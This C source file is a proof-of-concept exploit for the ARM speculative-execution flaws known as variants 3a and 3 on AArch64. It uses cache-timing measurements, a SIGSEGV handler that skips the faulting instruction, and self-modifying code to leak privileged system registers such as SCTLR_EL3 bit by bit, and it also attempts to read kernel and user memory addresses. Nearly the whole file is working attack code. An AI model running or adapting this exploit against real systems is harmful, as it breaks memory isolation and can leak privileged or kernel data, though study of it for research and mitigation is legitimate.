/*
	PoC code implementing variant 3a and partially 3 attacks for AArch64
	See the ARM whitepaper at: https://developer.arm.com/support/security-update

	Tested on Cortex-A57.
*/

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <pthread.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>

volatile uint64_t counter = 0;
volatile int read_bit;
uint8_t *probe;
uintptr_t *zrbf;
uint32_t *codebuf;
uint64_t miss_min;

enum _regs {
	MPIDR_EL1,
	SCTLR_EL3
} regs;

#define DEBUG 0
/*#define BY_ARTICLE*/

#if DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...)
#endif

#define zrbf_stride (4 * 1024/sizeof(uintptr_t))
const size_t zrbf_size = 10 * zrbf_stride * sizeof(uintptr_t);
#define probe_stride (4 * 1024) /*4K, a 1x page size*/
#define PAGE_SIZE 0x1000 

extern void spec_read(void *probe_buf, void* chain, uint64_t bit);
void (*do_spec_read)(void *probe_buf, void* chain, uint64_t bit);

extern void mem_read(void *probe_buf, void* chain, uint64_t bit, uint64_t mem);
extern void mem_read_by_article(void *probe_buf, void* chain, uint64_t bit, uint64_t mem);
void (*do_mem_read)(void *probe_buf, void* chain, uint64_t bit, uint64_t mem);

/* To know if data is in cache or not measure the time 
	it is taking to load it. */
uint64_t timed_read(uint8_t *addr) {
	uint64_t ns = counter;

	asm volatile (
	"DSB SY\n"
	"LDR X5, [%[ad]]\n"
	"DSB SY\n"
	: : [ad] "r" (addr) : "x5");

	return counter-ns;
}

void flush(void *addr, size_t size) {
	size_t bytes_cleaned = 0;
	unsigned long address = (unsigned long) addr;
	while (size >= bytes_cleaned) {
		/* only C&I by VA ensures broadcasting the CMO
		to other cores */
		asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (address));
		address += 4; /* to optimize the cache line size can be put here */
		bytes_cleaned += 4;
	}
	/* Not sure if ISB aka flushing the cpu pipeline is necessary here */
	asm volatile("DSB SY\nISB SY\n");
}

void *inc_counter(void *a) {
	while(1) {
	counter++;
	asm volatile ("DMB SY");
	}
}

#if 0
/* speculative load from spec_read() loads either page#1 or #2 to Dcache.
	By measuring the time needding to load register with the page#1 or #2 
	we know whether it is 0 or 1.*/ 
void get_value(int i, siginfo_t *info, void *ctx) {
	/* time needing to load probe[4K] */
	//uint64_t ns = timed_read(&probe[probe_stride]);
	uint64_t ns = timed_read( (uint8_t*) ((volatile long unsigned int)probe + PAGE_SIZE + 4));
	if (ns < miss_min && ns > 0) {
	read_bit = 1;
	} else {
	/* time needing to load probe[0] */
	uint64_t ns = timed_read(&probe[0]);
	if (ns < miss_min && ns > 0) {
	read_bit = 0;
	} else {
	read_bit = -1;
	}
	}
//debug("rb%d ", (int)read_bit);

	ucontext_t *c = (ucontext_t *)ctx;
	/* when cpu recives a signal handler and we custom handle it
	and upon returning from the handler the pc points to the instruction
	that caused it. So to avoid re-running it (infinitely) set $pc+=24 
	*/
	c->uc_mcontext.pc += 24;
}

#else

void get_value(int i, siginfo_t *info, void *ctx) {
	read_bit = 0;

	/* time taking loading page1st */
	uint64_t ns = timed_read(&probe[probe_stride]);
	if (ns < miss_min && ns > 0) {
		read_bit = 1;
	} else {
		/* time taking loading page2nd */
		uint64_t ns2 = timed_read(&probe[0]);
		if (ns2 >= miss_min || ns2 == 0) {
			read_bit = -1;
		}
	}

	ucontext_t *c = (ucontext_t *)ctx;
	// when returning from signal handling go to ret of the spec_read (or mem_read)
#ifdef BY_ARTICLE
	c->uc_mcontext.pc += 28;
#else
	c->uc_mcontext.pc += 24;
#endif
}
#endif

unsigned int
get_mrs(enum _regs regs) {
	unsigned int opcode = 0;

	switch(regs) {
	case SCTLR_EL3:
		opcode = 0xd53e1003/*mrs x3, sctlr_el3*/;
	break;
	case MPIDR_EL1:
		opcode = 0xd53800a3/*mrs x3, mpidr_el1*/; 
	break;
	default:
		return opcode;
	}

	return opcode;
}

#define CODE_SIZE 100
int read_register(enum _regs regs, uint64_t *val) {

	do_spec_read = (void (*)(void *, void *, uint64_t))codebuf;
	memcpy(codebuf, spec_read, CODE_SIZE);
	codebuf[5] = get_mrs(regs);
	/* for self-modyfing code push the codebuf to PoU
	   and invalidate L1 instruction cache 
         */
	__clear_cache(codebuf, codebuf + CODE_SIZE + 1);
	
	int timeout = 20000;

	debug("zrbf@ %p zrbf_stride*sizeof(uintptr_t) %lu\n", 
	(void*)zrbf,(unsigned long) zrbf_stride*sizeof(uintptr_t));

	uint64_t cur_value = 0;
	for (uint64_t bit = 0; bit < 64; bit++) {
		bool valid = false;
		int prev_bit;

		do {
			do {
				flush(probe, 2*PAGE_SIZE);
				flush(zrbf, zrbf_stride*sizeof(uintptr_t));
				do_spec_read(probe, &zrbf[zrbf_stride*3], bit);
				prev_bit = read_bit;
				timeout--;
			} while (prev_bit < 0 && timeout > 0);

			valid = true;
			for (int r = 0; r < 10 && valid; r++) {
				flush(probe, 2*PAGE_SIZE);
				flush(zrbf, zrbf_stride*sizeof(uintptr_t));
				do_spec_read(probe, &zrbf[zrbf_stride*3], bit);
				if (read_bit != prev_bit) {
					valid = false;
				}
				timeout--;
			}
		} while (!valid && timeout > 0);

		if (read_bit >= 0) {
			cur_value |= ((uint64_t)read_bit) << bit;
		}
	}

	*val = cur_value;

	if (timeout <= 0) return -1;
	return 0;
}

#undef CODE_SIZE
#define CODE_SIZE 100
int read_mem(uint64_t *val, uint64_t mem_addr) {

	int timeout = 20000;

	uint64_t cur_value = 0;
	for (uint64_t bit = 0; bit < 32; bit++) {
		bool valid = false;
		int prev_bit;

#if 1
		do {
			do {
				flush(probe, 2*PAGE_SIZE);
				flush(zrbf, zrbf_stride*sizeof(uintptr_t));
				do_mem_read(probe, &zrbf[zrbf_stride*3], bit, mem_addr);
				prev_bit = read_bit;
				timeout--;
			} while (prev_bit < 0 && timeout > 0);

			valid = true;
			for (int r = 0; r < 10 && valid; r++) {
				flush(probe, 2*PAGE_SIZE);
				flush(zrbf, zrbf_stride*sizeof(uintptr_t));
				do_mem_read(probe, &zrbf[zrbf_stride*3], bit, mem_addr);
				if (read_bit != prev_bit) {
					valid = false;
			}
			timeout--;
			}
		} while (!valid && timeout > 0);

		if (read_bit >= 0)
			cur_value |= ((uint64_t)read_bit) << bit;
		else 
		    return -1;
	}
#else
	do {
	flush(probe, 2);
	do_mem_read(probe, &zrbf[zrbf_stride*3], bit, mem_addr);
	timeout--;
	} while (read_bit < 0 && timeout > 0);

	if (read_bit >= 0) {
	cur_value |= ((uint64_t)read_bit) << bit;
	} else {
	printf("Unreliable reading\n");
	}
	}
#endif
	
	*val = cur_value;

	if (timeout <= 0) return -1;
	return 0;
}

/* measure latency in loading a register 
	with data missed in cache. Record the lowest value */
uint64_t measure_latency() {
	uint64_t ns[2] = {0}; /* [0] for cache miss, [1] for cache hit */
	uint64_t total[2] = {0};
	uint64_t min[2] = {0xFFFFF};

	for (int r = 0; r < 300; r++) {
		flush(probe, 2*PAGE_SIZE);
		ns[0] = timed_read(&probe[0]);
		ns[1] = timed_read(&probe[0]);
		total[0] += ns[0];
		total[1] += ns[1];
		if (ns[0] < min[0]) min[0] = ns[0];
	}

	debug("avg latency for cache miss %lu\n", total[0]/300); 
	debug("min latency for cache miss %lu\n", min[0]); 
	debug("avg latency for cache hit %lu\n", total[1]/300);
	return total[0]/300/*min*/;
}

int main() {
	struct sigaction act;
	uint64_t val;
	act.sa_sigaction = get_value;
	sigemptyset(&act.sa_mask);
	act.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &act, NULL);

	codebuf = mmap(NULL, PAGE_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	assert(codebuf != MAP_FAILED);
	debug("codebuf@%p\n", (void*)codebuf);

	probe = mmap(NULL, PAGE_SIZE*2, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	assert(probe != MAP_FAILED);
	debug("probe@%p\n", (void*)probe);

	/* dereference chain */
	zrbf = mmap(NULL, zrbf_size/*10 pages*/, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	assert(zrbf != MAP_FAILED);
	zrbf[0] = 0;

	// set up the dereference chain used to stall execution
	for (int i = 1; i < 10; i++) {
		zrbf[i*zrbf_stride] = (uintptr_t)&zrbf[(i-1)*zrbf_stride];
	}

	/* Trigger copy on write for the 2x pages we crated */
	for (int i = 0; i < 2*PAGE_SIZE; i += PAGE_SIZE) {
		probe[i] = 1;
	}

	pthread_t inc_counter_thread;
	if(pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
	while(counter == 0);
	asm volatile ("DSB SY");

	miss_min = measure_latency();
	if (miss_min == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}
	miss_min -=1;

#if 1
	if (read_register(MPIDR_EL1, &val) == 0) {
		printf("%s: 0x%lx", "MPIDR_EL1", val);
		printf(" (cpu%u, cluster%u)\n", 
		(unsigned)(val&0xff), (unsigned)((val>>8)&0xff)); 
	} else {
		printf("Deciphering mpidr_el1 failed\n");
	}

	if (read_register(SCTLR_EL3, &val) == 0)
		printf("%s: 0x%lx\n", "SCTLR_EL3", val);
	else 
		printf("Deciphering sctlr_el3 failed\n");
#endif

{ 
	/* this part tries to do the memory address dereference */
	int rc;
	unsigned long memory;
	do_mem_read = (void (*)(void *, void*, uint64_t, uint64_t))codebuf;
	memcpy(codebuf, 
#ifdef BY_ARTICLE
mem_read_by_article, 
#else 
mem_read,
#endif
	CODE_SIZE);
	__clear_cache(codebuf, codebuf + CODE_SIZE + 1);
	
	/* memory to deference 0xFFFFFFC00009ACE8 
	   -> *(0xFFFFFFC00009ACE8) = armsm "ret" 
	   -> opcode = 0xd65f03c0
	   which is mapped in kernel pages (TTBR1_EL1) and is kernel .text 
	   Unfortunately doesn't work with me.
	*/
	memory = 0xFFFFFFC00009ACE8;
	rc = read_mem(&val, memory);
	printf("memory at 0x%lx (kern): 0x%lx %s\n", memory, val, (rc == -1) ? "fail" : "");

	/* 0x400000 was mapped in TTBR0_EL1 meaning is a user space addresses mapped
	and it can be dereferenced. True for the machine I tested on
	*/
	memory = 0x400000;
	rc = read_mem(&val, memory);
	printf("memory at 0x%lx (user): 0x%lx %s\n", memory, val, (rc == -1) ? "fail" : "");
	
	/* Another address I happened to have mapped in TTBR0_EL1 is
	   0x7FECB38000 NP:0x75604000 Level 3 Page
	   UXN=1, PXN=1, Contiguous=0, nG=1, AF=1, SH=0x3, AP=0x1, AttrIndx=0x4
	*/
	memory = 0x7FECB38000;
	rc = read_mem(&val, memory);
	printf("memory at 0x%lx (user): 0x%lx %s\n", memory, val, (rc == -1) ? "fail" : "");
}


	return 0;
}
